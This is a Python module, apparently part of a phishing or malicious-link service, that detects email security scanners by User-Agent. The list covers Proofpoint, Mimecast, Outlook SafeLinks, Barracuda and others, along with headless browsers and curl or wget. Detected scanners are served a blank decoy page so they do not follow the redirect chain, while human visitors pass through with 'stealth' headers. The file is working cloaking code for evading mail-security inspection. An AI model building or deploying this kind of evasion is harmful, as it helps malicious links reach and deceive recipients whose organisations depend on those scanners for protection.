"""
Email Scanner & Bot Detection Service
Detects known email security scanners, URL preview bots, and non-human traffic.
Returns appropriate action: 'allow', 'delay', 'safe_response', 'block'
"""

import re
import time
import random
import logging
from typing import Dict

logger = logging.getLogger(__name__)

# ─── Known email scanner / preview bot User-Agent patterns ───────────────────
EMAIL_SCANNER_PATTERNS = [
    # Google
    (re.compile(r'GoogleImageProxy', re.I),            'google_image_proxy'),
    (re.compile(r'Google.*SafeBrowsing', re.I),        'google_safe_browsing'),
    (re.compile(r'Googlebot', re.I),                   'googlebot'),
    # Microsoft / Outlook
    (re.compile(r'msnbot', re.I),                      'msnbot'),
    (re.compile(r'SkypeUriPreview', re.I),             'skype_preview'),
    (re.compile(r'Outlook.*SafeLinks', re.I),          'outlook_safelinks'),
    (re.compile(r'Microsoft.*URL.*Preview', re.I),     'ms_url_preview'),
    (re.compile(r'bingpreview', re.I),                 'bing_preview'),
    # Barracuda
    (re.compile(r'Barracuda', re.I),                   'barracuda'),
    # Proofpoint
    (re.compile(r'Proofpoint', re.I),                  'proofpoint'),
    # Symantec / Broadcom
    (re.compile(r'Symantec.*MessageLabs', re.I),       'symantec_ml'),
    (re.compile(r'Messagelabs', re.I),                 'messagelabs'),
    # Mimecast
    (re.compile(r'Mimecast', re.I),                    'mimecast'),
    # SpamAssassin / general scanners
    (re.compile(r'SpamAssassin', re.I),                'spamassassin'),
    (re.compile(r'CheckPoint.*URL', re.I),             'checkpoint'),
    (re.compile(r'Cisco.*Talos', re.I),                'cisco_talos'),
    (re.compile(r'Fortinet', re.I),                    'fortinet'),
    (re.compile(r'Sophos', re.I),                      'sophos'),
    (re.compile(r'TrendMicro', re.I),                  'trendmicro'),
    (re.compile(r'IronPort', re.I),                    'cisco_ironport'),
    (re.compile(r'McAfee.*Web', re.I),                 'mcafee'),
    # Generic crawlers / headless
    (re.compile(r'HeadlessChrome', re.I),              'headless_chrome'),
    (re.compile(r'PhantomJS', re.I),                   'phantomjs'),
    (re.compile(r'Selenium', re.I),                    'selenium'),
    (re.compile(r'wget|curl(?!/)', re.I),              'cli_tool'),
    (re.compile(r'python-requests|python-urllib', re.I), 'python_http'),
    (re.compile(r'go-http-client', re.I),              'go_http'),
    (re.compile(r'Java\/\d', re.I),                    'java_http'),
    # Generic bot
    (re.compile(r'\bbot\b|\bspider\b|\bcrawler\b|\bscraper\b', re.I), 'generic_bot'),
]

# ─── Patterns that definitively indicate an email security scanner ────────────
HARD_SCANNER_PATTERNS = {
    'google_image_proxy', 'outlook_safelinks', 'ms_url_preview',
    'barracuda', 'proofpoint', 'symantec_ml', 'messagelabs',
    'mimecast', 'spamassassin', 'checkpoint', 'cisco_talos',
    'fortinet', 'sophos', 'trendmicro', 'cisco_ironport', 'mcafee',
}


def detect_scanner(user_agent: str, ip: str = '', referrer: str = '') -> Dict:  # noqa: ARG001
    """
    Analyse a request and return detection metadata.

    Returns:
        {
          'is_scanner': bool,
          'is_bot': bool,
          'scanner_type': str | None,
          'action': 'allow' | 'delay' | 'safe_response' | 'block',
          'confidence': float,   # 0.0 – 1.0
          'reason': str,
        }
    """
    ua = user_agent or ''
    result = {
        'is_scanner': False,
        'is_bot': False,
        'scanner_type': None,
        'action': 'allow',
        'confidence': 0.0,
        'reason': 'clean',
    }

    for pattern, scanner_type in EMAIL_SCANNER_PATTERNS:
        if pattern.search(ua):
            is_hard = scanner_type in HARD_SCANNER_PATTERNS
            result.update({
                'is_scanner': is_hard,
                'is_bot': True,
                'scanner_type': scanner_type,
                'action': 'safe_response' if is_hard else 'block',
                'confidence': 1.0 if is_hard else 0.85,
                'reason': f'ua_match:{scanner_type}',
            })
            return result

    # Empty / very short User-Agent — note it but do NOT hard-block.
    # Node.js fetch, curl, and legitimate API clients may send minimal UAs.
    if len(ua.strip()) < 10:
        result.update({
            'is_bot': True,
            'action': 'allow',   # allow through; honeypot will catch repeat offenders
            'confidence': 0.5,
            'reason': 'short_ua',
        })
        return result

    return result


def human_simulation_delay(min_ms: int = 150, max_ms: int = 400) -> None:
    """Add realistic human-like delay to mimic browser latency."""
    delay_s = random.uniform(min_ms / 1000, max_ms / 1000)
    time.sleep(delay_s)


def get_stealth_headers() -> Dict[str, str]:
    """Return headers that prevent caching and referrer leakage."""
    return {
        'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Referrer-Policy': 'no-referrer',
        'X-Robots-Tag': 'noindex, nofollow, noarchive',
    }


def scanner_safe_response():
    """
    Return a minimal 200 response for email scanner requests.
    Prevents scanners from following the full redirect chain.
    """
    from flask import Response
    # Tiny valid HTML page — looks like a static resource to scanners
    html = (
        '<!DOCTYPE html><html><head>'
        '<meta http-equiv="refresh" content="0;url=about:blank">'
        '</head><body></body></html>'
    )
    resp = Response(html, status=200, mimetype='text/html')
    for k, v in get_stealth_headers().items():
        resp.headers[k] = v
    resp.headers['X-Scanner-Deflect'] = '1'
    return resp
